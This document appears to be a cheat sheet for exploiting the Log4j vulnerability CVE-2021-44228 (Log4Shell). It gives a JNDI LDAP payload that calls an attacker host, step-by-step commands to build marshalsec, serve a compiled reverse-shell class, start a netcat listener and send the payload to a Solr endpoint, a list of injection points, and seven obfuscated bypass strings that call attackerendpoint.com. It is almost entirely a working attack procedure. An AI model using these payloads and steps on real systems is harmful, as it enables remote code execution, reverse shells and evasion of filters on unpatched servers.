## CVE-2021–44228 Log4j

### CVSS Score: 10

### Tools: mvn marshalsec netcat JNDI Exploit kit https://github.com/pimps/JNDI-Exploit-Kit

### Payload example: 

    ${jndi:ldap://ATTACKER_IP:1389/Exploit.class}

## Steps: 

#### 1) 

    cd /marshalsec

#### 2) 

    mvn clean package -DskipTests (Install marshalsec utility)

#### 3) 

    java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://ATTACKER_IP:8000/#Exploit" (Host LDAP server with marshalsec)

#### 4) Create a java reverse shell exploit (Exploit.java)

#### 5) 

    javac Exploit.java -target 8 -source 8 (Compile the java exploit into a class file (Exploit.class))

#### 6) 

    python3 -m http.server 8000 (Host compiled payload to HTTP server)

#### 7)  

    nc -lvnp PORT (Setup listener)

#### 8) 

    curl 'http://MACHINE_IP:8983/solr/admin/cores?foo=$\{jndi:ldap://ATTACKER_IP:1389/Exploit\}' (Send payload to target machine to get a reverse shell)

## JNDI syntax injection:

#### 1) Anywhere that has data logged by the application

#### 2) Input boxes, user and password login forms, data entry points within applications

#### 3) HTTP headers such as User-Agent, X-Forwarded-For, X-ApiVersion, or other customizable headers

#### 4) Any place for user-supplied data

## Bypass examples:

#### 1) 

    ${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//attackerendpoint.com/}

#### 2) 

    ${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://attackerendpoint.com/}

#### 3) 

    ${${upper:j}ndi:${upper:l}${upper:d}a${lower:p}://attackerendpoint.com/}

#### 4) 

    ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attackerendpoint.com/z}

#### 5) 

    ${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attackerendpoint.com/}

#### 6) 

    ${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://attackerendpoint.com/}

#### 7) 

    ${${::-j}ndi:rmi://attackerendpoint.com/}
